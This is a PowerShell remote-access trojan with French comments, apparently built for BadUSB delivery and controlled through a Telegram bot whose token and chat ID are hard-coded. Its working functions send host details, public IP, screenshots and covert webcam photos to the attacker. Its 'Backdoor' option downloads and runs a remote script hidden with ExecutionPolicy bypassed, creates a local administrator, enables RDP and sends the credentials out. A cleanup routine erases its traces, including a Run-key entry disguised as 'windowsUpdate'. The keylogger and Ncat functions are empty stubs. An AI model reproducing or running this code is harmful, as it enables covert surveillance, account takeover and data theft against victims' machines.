# Gestion Bot 
$BotToken = "6233862997:AAFxv4SBakCHVM3zqBqkqUcjAJYHjhdNyZw"
$ChatID = '429367185'
# Liens Script BackDoor
$githubScript = "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1"
# Gestion Creation Admin
$ScriptAdmin = "https://raw.githubusercontent.com/Machiavel-QuadCore/BadUsb/main/test.ps1"
$Username = "Bot_Machia"
$Password = "QuadCore"
$lastProcessedUpdateID = 0

$whoami = whoami
$ipV4 = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
$hostname = $env:COMPUTERNAME
$pwd = Get-Location

function Send-Message {
    param (
        [string]$Message,
        [string]$ReplyMarkup
    )
    $curl = Install-Curl
    $body = @{
        "chat_id" = $ChatID
        "text" = $Message
        "reply_markup" = $ReplyMarkup
    }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" -Method POST -Body $body | Out-Null
}

function Information {
    $InformationsMessage = "‚ÑπÔ∏è Informations g√©n√©rales`n`n" +
    "üåê Tu es connect√© : $ipV4`n" +
    "üñ•Ô∏è Nom du PC : $hostname`n" +
    "üôé Utilisateur : $whoami`n" +
    "üìÇ Chemin du Script : $pwd"

    Send-Message -Message $InformationsMessage

    # R√©afficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}
function IpPublic {
    $ipInfo = Invoke-RestMethod "http://ipinfo.io/json"
    $ipPublic = "     üß≠ Localisation`n - - - - - - - - - - - - -`n`nüåç IP: $($ipInfo.ip)`nüèôÔ∏è Ville: $($ipInfo.city)`nüìÆ Code Postal: $($ipInfo.postal)`nüè¥‚Äç‚ò†Ô∏è R√©gion: $($ipInfo.region)"

    Send-Message -Message $ipPublic

    # R√©afficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function Take-Screenshot {
      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
        function screenshot([Drawing.Rectangle]$bounds, $path) {
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

           $bmp.Save($path)

           $graphics.Dispose()
           $bmp.Dispose()
        }
        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        screenshot $bounds "C:\Users\$env:username\Documents\screenshot.jpg"
}

function Send-Take-Screenshot {
    $SendScreen = "üì® Envoie du Screenshot..."
    Send-Message -Message $SendScreen
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
    $curl = Install-Curl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5
    
    $SuppScreen = "‚ôªÔ∏è Suppression du Screenshot..."
    Send-Message -Message $SuppScreen
    Remove-Item $photo
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5
    $ScreenSupprimer = "‚úÖ Le screenshot √† √©t√© supprim√©."
    Send-Message -Message $ScreenSupprimer
    #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"

        # R√©afficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function webcam {
    $webcamDownload = "‚åõ T√©l√©chargement..."
    Send-Message -Message $webcamDownload
    # https://batchloaf.wordpress.com/commandcam/
    $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
    $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5
    $webcamDownloadFini = "üÜó T√©l√©chargement termin√©."
    Send-Message -Message $webcamDownloadFini

    $webcamPrise = "üì∑ Prendre une photo..."
    Send-Message -Message $webcamPrise
    $args = "/filename C:\Users\$env:username\Documents\image.jpg"
    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5

    $webcamEnvoie = "üì® Envoi de la photo..."
    Send-Message -Message $webcamEnvoie
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
    $photo = "C:\Users\$env:username\Documents\image.jpg"
    $curl = Install-Curl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5

    $webcamSupp = "‚ôªÔ∏è Suppression de la photo..."
    Send-Message -Message $webcamSupp
    Remove-Item $photo
    Remove-Item $outpath
    Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 5
    $webcamSupprimer = "‚úÖ L'image √† √©t√© supprim√©."
    Send-Message -Message $webcamSupprimer

            # R√©afficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function CreeAdmin {
	# T√©l√©charger un script depuis une URL sp√©cifi√©e et l'enregistrer sur le disque local
	$scriptPath = "C:\Users\$env:username\Documents\NewUser.ps1"
	Invoke-WebRequest -Uri $ScriptAdmin -OutFile $scriptPath

	Send-Message -Message "‚úÖ T√©l√©chargement Termin√©..."

	Start-Sleep -Seconds 5

	# Ex√©cuter le script t√©l√©charg√© en mode silencieux et invisible
	powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath

	Send-Message -Message "‚úÖ Script ex√©cut√©."

	# Cr√©er le compte utilisateur
	$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
	New-LocalUser -Name $Username -Password $SecurePassword -FullName "Administrateur" -Description "Compte administrateur cr√©√© par script" -PasswordNeverExpires
	Send-Message -Message "‚úÖ Compte utilisateur cr√©√©."

	# Ajouter l'utilisateur au groupe Administrateurs
	Add-LocalGroupMember -Group "Administrateurs" -Member $Username
	Send-Message -Message "‚úÖ Utilisateur ajout√© au groupe Administrateurs."

	# Activer l'acc√®s RDP
	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
	Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
	Send-Message -Message "‚úÖ Acc√®s RDP activ√©."

	# R√©cup√©rer l'adresse IP
	$IpAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.AddressFamily -eq "IPv4" }).IPAddress
	Send-Message -Message "‚úÖ Adresse IP r√©cup√©r√©e."

	# Envoyer les informations d'acc√®s RDP au bot Telegram
	$RdpAccessMessage = "Acc√®s RDP :`nAdresse IP : $IpAddress`nNom d'utilisateur : $Username`nMot de passe : $Password"
	Send-Message -Message $RdpAccessMessage
	
	            # R√©afficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function Invoke-BackDoor {
    # Code pour ex√©cuter la fonctionnalit√© de la backdoor
}

function Download-File($FileToDownload) {
    # Code pour t√©l√©charger un fichier
}

function Main-Browser {
    # Code pour lancer le navigateur
}

function Start-Ncat {
    param (
        [string]$ip
    )
    # Code pour d√©marrer Ncat avec l'adresse IP sp√©cifi√©e
}

function Stop-Ncat {
    # Code pour arr√™ter Ncat
}

function Start-Keylogger {
    param (
        [string]$time
    )
    # Code pour d√©marrer le keylogger avec la dur√©e sp√©cifi√©e
}

function Clean-All {
    $checkEmoji = "‚úÖ"
    $crossEmoji = "‚ùå"
    $VideEmoji = "‚ôªÔ∏è"
    # Suppression des captures d'√©cran
    $screenshotPath = "C:\Users\$env:username\Documents\screenshot.jpg"
    if (Test-Path $screenshotPath) {
        Send-Message -Message "$VideEmoji Suppression des captures d'√©cran..."
        Remove-Item $screenshotPath -ErrorAction SilentlyContinue
        Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
        Send-Message -Message "$checkEmoji Les captures d'√©cran ont √©t√© supprim√©es."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji Aucune capture d'√©cran trouv√©e."
    }

    # Suppression cURL
    $curlPath = "C:\Users\$env:username\AppData\Local\Temp\1"
    if (Test-Path $curlPath) {
        Send-Message -Message "$VideEmoji Suppression de cURL..."
        Remove-Item -Path $curlPath -Recurse -Force -ErrorAction SilentlyContinue
        Send-Message -Message "$checkEmoji cURL a √©t√© supprim√©."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji cURL non trouv√©."
    }

    # Suppression de la Backdoor
    $backdoorPath = "C:\Users\$env:username\Documents\windowsUpdate.ps1"
    $regKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
    $backdoorExists = $false
    if (Test-Path $backdoorPath) {
        $backdoorExists = $true
        Remove-Item $backdoorPath -ErrorAction SilentlyContinue
    }
    if ((Get-ItemProperty -Path $regKey -Name "windowsUpdate" -ErrorAction SilentlyContinue) -ne $null) {
        $backdoorExists = $true
        reg delete $regKey /v windowsUpdate /f
    }
    if ($backdoorExists) {
        Send-Message -Message "$VideEmoji Suppression de la Backdoor..."
        Start-Sleep -Seconds 5
        Send-Message -Message "$checkEmoji La Backdoor a √©t√© supprim√©e."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji La Backdoor n'a pas √©t√© trouv√©e."
    }

    # Suppression de la webcam
    $webcamPath = "C:\Users\$env:username\Documents\CommandCam.exe"
    if (Test-Path $webcamPath) {
        Send-Message -Message "$VideEmoji Suppression de la webcam..."
        Remove-Item $webcamPath -ErrorAction SilentlyContinue
        Wait-Process -Name "powershell" -ErrorAction SilentlyContinue
        Send-Message -Message "$checkEmoji L'acc√®s √† la webcam a √©t√© supprim√©."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji Aucune webcam trouv√©e."
    }

    # Suppression du Ncat
    $ncatPath = "C:\Users\$env:username\Documents\nc"
    $ncatZipPath = "C:\Users\$env:username\Documents\nc.zip"
    $ncatExists = $false
    if (Test-Path $ncatPath) {
        $ncatExists = $true
        Remove-Item -Path $ncatPath -Recurse -ErrorAction SilentlyContinue
    }
    if (Test-Path $ncatZipPath) {
        $ncatExists = $true
        Remove-Item $ncatZipPath -ErrorAction SilentlyContinue
    }
    if ($ncatExists) {
        Send-Message -Message "$VideEmoji Suppression de Ncat..."
        Start-Sleep -Seconds 5
        Send-Message -Message "$checkEmoji Ncat a √©t√© supprim√©."
        Start-Sleep -Seconds 5
    } else {
        Send-Message -Message "$crossEmoji Ncat non trouv√©."
    }

    # R√©afficher le menu
    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
}

function Install-Curl {
    $curl = "C:\Users\" + $env:username + "\appdata\local\temp\1\curl.exe"
    if(![System.IO.File]::Exists($curl)){
        # file with path $path doesn't exist
        $ruta = "C:\Users\" + $env:username + "\appdata\local\temp\1"
        $curl_zip = $ruta + "\curl.zip"
        $curl = $ruta + "\" + "curl.exe"
        $curl_mod = $ruta + "\" + "curl_mod.exe"
        if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
        if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
        [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
        }
        return $curl
    }
    # else curl exist
    return $curl
}

function Show-Help {
    $helpMessage = "üìö Voici les options disponibles :

- *‚ÅâÔ∏è Informations* : Affiche des informations g√©n√©rales sur le syst√®me.
- *üåç Connexion* : Permet d'acc√©der aux fonctionnalit√©s de connexion.
- *‚õìÔ∏è Photo* : Donne acc√®s aux fonctionnalit√©s de capture d'√©cran et de webcam.
- *üì∑ Autre* : Propose d'autres fonctionnalit√©s telles que le keylogger et la backdoor.
- *üóëÔ∏è Tous Supprimer* : Supprime toutes les donn√©es et r√©initialise le bot.

‚ùì Que souhaitez-vous faire ? üëá"

     Send-Message -Message $helpMessage -ReplyMarkup $menuKeyboard

}

$messageRetour = "‚ùì Que souhaitez-vous faire üëáüèª"

$menuMessage = "üëã Hey Salut $($env:USERNAME),`n`n" +
    "‚ùì Que souhaitez-vous faire ? üëá"

$menuKeyboard = '{
    "keyboard": [
        [
            {"text": "üîé InfoBot"}
        ],
        [
            {"text": "‚ÅâÔ∏è Informations"}
        ],
        [
            {"text": "üåç Connexion"}
        ],
        [
            {"text": "‚õìÔ∏è Photo"}
        ],
        [
            {"text": "üì∑ Autre"}
        ],
        [
            {"text": "üóëÔ∏è Tous Supprimer"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

$subMenuKeyboardInfo = '{
    "keyboard": [
        [
            {"text": "‚åöÔ∏è Information G√©n√©ral"}
        ],
        [
            {"text": "‚ö†Ô∏è Ip Publique"}
        ],
        [
            {"text": "üîô Retour au Menu"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

$subMenuKeyboardConnexion = '{
    "keyboard": [
        [
            {"text": "‚åöÔ∏è Ncat"}
        ],
        [
            {"text": "üîô Retour au Menu"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

$subMenuKeyboardPhoto = '{
    "keyboard": [
        [
            {"text": "üñ•Ô∏è Capture Scrennshot"}
        ],
        [
            {"text": "üì∑ Webcam"}
        ],
        [
            {"text": "üîô Retour au Menu"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

$subMenuKeyboardAutre = '{
    "keyboard": [
        [
            {"text": "üîë Keylogger"}
        ],
        [
            {"text": "üö™ Backdoor"}
        ],
        [
            {"text": "üîô Retour au Menu"}
        ]
    ],
    "resize_keyboard": true,
    "one_time_keyboard": true
}'

while ($true) {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/getUpdates?offset=$($lastProcessedUpdateID + 1)" -Method GET
    foreach ($update in $updates.result) {
        $lastProcessedUpdateID = $update.update_id
        $messageText = $update.message.text

        # Ajoutez cette ligne pour √©viter de traiter les anciens messages et les commandes d√©j√† ex√©cut√©es
        if ($update.message.date -le [DateTimeOffset]::Now.ToUnixTimeSeconds() - 10) { continue }

        switch ($messageText) {
            "üîé InfoBot" { Show-Help -ReplyMarkup $menuKeyboard; break }
            "‚ÅâÔ∏è Informations" { Send-Message -Message $messageRetour -ReplyMarkup $subMenuKeyboardInfo; break }
            "üåç Connexion" { Send-Message -Message $messageRetour -ReplyMarkup $subMenuKeyboardConnexion; break }
            "‚õìÔ∏è Photo" { Send-Message -Message $messageRetour -ReplyMarkup $subMenuKeyboardPhoto; break }
            "üì∑ Autre" { Send-Message -Message $messageRetour -ReplyMarkup $subMenuKeyboardAutre; break }
            "üîô Retour au Menu" { Send-Message -Message $menuMessage -ReplyMarkup $menuKeyboard; break }
            "üóëÔ∏è Tous Supprimer" { Clean-All; break }
            "‚åöÔ∏è Information G√©n√©ral" { Information; break }
            "‚ö†Ô∏è Ip Publique" { IpPublic; break }
            "üñ•Ô∏è Capture Scrennshot" { Take-Screenshot; Send-Take-Screenshot; break }
            "üì∑ Webcam" { webcam; break }
            "üîë Keylogger" { Start-Keylogger -time 15; break }
            "üö™ Backdoor" { CreeAdmin; break }
            "‚åöÔ∏è Ncat" { Start-Ncat -ip "example.com"; break }
            default {
                # Afficher le menu principal
                Send-Message -Message $menuMessage -ReplyMarkup $menuKeyboard

                # Si l'entr√©e de l'utilisateur est un nombre entier, d√©marrez le keylogger avec le nombre de secondes sp√©cifi√©
                if ($messageText -match "^\d+$") {
                    $time = [int]$messageText
                    Start-Keylogger -Seconds $time
                }
                # Si l'entr√©e de l'utilisateur est une adresse IP valide, d√©marrez Ncat avec l'adresse IP sp√©cifi√©e
                elseif ($messageText -match "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$") {
                    $ipAddress = $messageText
                    Start-Ncat -ip $ipAddress
                }
                # Si aucune des conditions pr√©c√©dentes n'est remplie, envoyer un message d'erreur
                #else {
                #    Send-Message -Message "Commande non reconnue. Veuillez s√©lectionner une option valide."
                #}
            }
        }
    }
    Start-Sleep -Seconds 1
}
